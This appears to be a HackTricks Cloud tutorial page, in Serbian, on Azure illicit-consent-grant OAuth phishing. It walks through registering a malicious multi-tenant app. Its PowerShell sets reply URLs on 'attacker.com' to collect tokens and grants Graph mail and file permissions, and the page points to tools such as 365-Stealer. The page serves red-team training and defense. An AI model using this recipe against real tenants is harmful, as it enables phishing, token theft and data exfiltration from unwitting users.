# Az - Illicit Consent Grant

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## OAuth App Phishing

**Azure aplikacije** traže dozvole za pristup **korisničkim podacima** (osnovne informacije, ali i pristup dokumentima, slanje e-pošte...).\
Ako je **dozvoljeno**, običan korisnik može dati saglasnost samo za **"niskoučinak" dozvole**. U **svim ostalim** slučajevima, **saglasnost administratora je potrebna**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` i prilagođena uloga koja uključuje `dozvolu za davanje dozvola aplikacijama` mogu pružiti saglasnost na nivou tenanta.

Samo dozvole koje **ne zahtevaju saglasnost administratora** klasifikuju se kao **niskoučinak**. Ovo su dozvole potrebne za **osnovno prijavljivanje, a to su openid, profil, e-pošta, User.Read i offline\_access**. Ako **organizacija** **dozvoli** korisničku saglasnost za **sve aplikacije**, zaposleni može dati saglasnost aplikaciji da **pročita navedene podatke iz svog profila**.

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

Stoga, napadač može pripremiti **zloćudnu aplikaciju** i uz pomoć **phishinga**, naterati korisnika da **prihvati aplikaciju i ukrade njegove podatke**.

### 2 Tipova Napada na Illicit Consent Grant

* **Neautentifikovani**: Iz spoljnog naloga kreirati aplikaciju sa dozvolama `User.Read` i `User.ReadBasic.All`, na primer, phishing korisnika, i moći ćete da pristupite informacijama iz direktorijuma.
* Ovo zahteva da phished korisnik može da prihvati OAuth aplikacije iz spoljnih okruženja!
* **Autentifikovani**: Nakon što je kompromitovan glavni korisnik sa dovoljno privilegija, kreirati aplikaciju unutar naloga i phishing neki privilegovani korisnik koji može prihvatiti privilegovane OAuth dozvole.
* U ovom slučaju već možete pristupiti informacijama iz direktorijuma, tako da dozvola `User.ReadBasic.All` više nije zanimljiva.
* Verovatno vas zanimaju **dozvole koje zahtevaju da ih administrator odobri**, jer običan korisnik ne može dati OAuth aplikacijama nikakvu dozvolu, zato treba da **phishujete samo te korisnike** (više o tome koje uloge/dozvole daju ovu privilegiju kasnije)

### Proverite da li su korisnici dozvolili saglasnost

Sledeća PowerShell komanda se koristi za proveru konfiguracije saglasnosti za korisnike u Azure Active Directory (Azure AD) u vezi sa njihovom sposobnošću da daju saglasnost aplikacijama:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **Onemogućite korisničke saglasnosti**: Ova postavka zabranjuje korisnicima da daju dozvole aplikacijama. Nema korisničke saglasnosti za aplikacije.
* **Korisnici mogu da daju saglasnost aplikacijama od verifikovanih izdavača ili vaše organizacije, ali samo za dozvole koje odaberete**: Ova postavka omogućava svim korisnicima da daju saglasnost samo aplikacijama koje su objavili verifikovani izdavači i aplikacijama registrovanim u vašem tenant-u. Dodaje nivo kontrole omogućavajući saglasnost samo za specifične dozvole.
* **Korisnici mogu da daju saglasnost svim aplikacijama**: Ova postavka je permisivnija i omogućava svim korisnicima da daju saglasnost za bilo koje dozvole aplikacija, sve dok te dozvole ne zahtevaju administrativnu saglasnost.
* **Prilagođena politika saglasnosti aplikacija**: Ova postavka ukazuje na to da je na snazi prilagođena politika, koja može biti prilagođena specifičnim organizacionim zahtevima i može uključivati kombinaciju ograničenja zasnovanih na izdavaču aplikacije, dozvolama koje aplikacija zahteva i drugim faktorima.

## **Razumevanje napada na nelegalnu saglasnost**

U napadu na nelegalnu saglasnost, napadači obmanjuju krajnje korisnike da daju dozvole zloćudnoj aplikaciji registrovanoj kod Azure-a. To se postiže tako što se aplikacija prikazuje kao legitimna, što dovodi žrtve da nesvesno kliknu na dugme "Prihvati". Kao rezultat, Azure AD izdaje token na napadačevom sajtu, omogućavajući im pristup i manipulaciju podacima žrtve, kao što su čitanje ili slanje e-pošte i pristup datotekama, bez potrebe za organizacionim nalogom.

## **Pregled toka napada**

Napad uključuje nekoliko koraka usmerenih na generičku kompaniju. Evo kako bi to moglo izgledati:

1. **Registracija domena i hostovanje aplikacije**: Napadač registruje domen koji podseća na pouzdanu stranicu, na primer, "safedomainlogin.com". Pod ovim domenom, kreira se poddomen (npr. "companyname.safedomainlogin.com") za hostovanje aplikacije dizajnirane da prikupi autorizacione kodove i zatraži pristupne tokene.
2. **Registracija aplikacije u Azure AD**: Napadač zatim registruje Multi-Tenant aplikaciju u svom Azure AD tenant-u, nazivajući je po ciljanom preduzeću kako bi izgledala legitimno. Konfiguriše URL za preusmeravanje aplikacije da upućuje na poddomen koji hostuje zloćudnu aplikaciju.
3. **Postavljanje dozvola**: Napadač postavlja aplikaciju sa raznim API dozvolama (npr. `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Ove dozvole, kada ih korisnik odobri, omogućavaju napadaču da izvuče osetljive informacije u ime korisnika.
4. **Distribucija zloćudnih linkova**: Napadač kreira link koji sadrži klijent id zloćudne aplikacije i deli ga sa ciljnim korisnicima, obmanjujući ih da daju saglasnost.

## **Korišćenje alata za napad**

Napad se može olakšati korišćenjem alata kao što je [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

### Priprema pre napada:

Ako napadač ima neki nivo pristupa korisniku u žrtvinom preduzeću, može proveriti da li politika organizacije omogućava korisniku da prihvati aplikacije:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Za izvođenje napada, napadač bi trebao da kreira **novu aplikaciju u svom Azure Tenant-u** (u registracijama aplikacija), konfigurisanu sa dozvolama:

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` se nalazi unutar `Microsoft Graph` u `Delegated permissions`. (Dozvole aplikacije će uvek zahtevati dodatno odobrenje).

* `User.ReadBasic.All` je dozvola koja će vam omogućiti da **pročitate informacije svih korisnika** u organizaciji ako je odobrena.
* Zapamtite da samo `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` i prilagođena uloga koja uključuje `dozvolu za dodeljivanje dozvola aplikacijama` mogu pružiti saglasnost na nivou tenanta. Dakle, trebali biste **phish-ovati korisnika sa jednom od tih uloga** ako želite da on odobri **aplikaciju koja zahteva admin saglasnost**.

Takođe možete kreirati aplikaciju putem cli sa: 

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

Check [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) to learn how to configure it.

{% hint style="warning" %}
Napomena da će dobijeni **access token** biti za **graph endpoint** sa opsegom: `User.Read` i `User.ReadBasic.All` (tražene dozvole). Nećete moći da izvršite druge radnje (ali su ove dovoljne da **preuzmete informacije o svim korisnicima** u organizaciji).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Možete koristiti ovaj alat za izvođenje ovog napada.

## Post-Exploitation

Kada dobijete pristup korisniku, možete raditi stvari kao što su krađa osetljivih dokumenata i čak otpremanje dokumenata sa backdoor-om.

## References

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
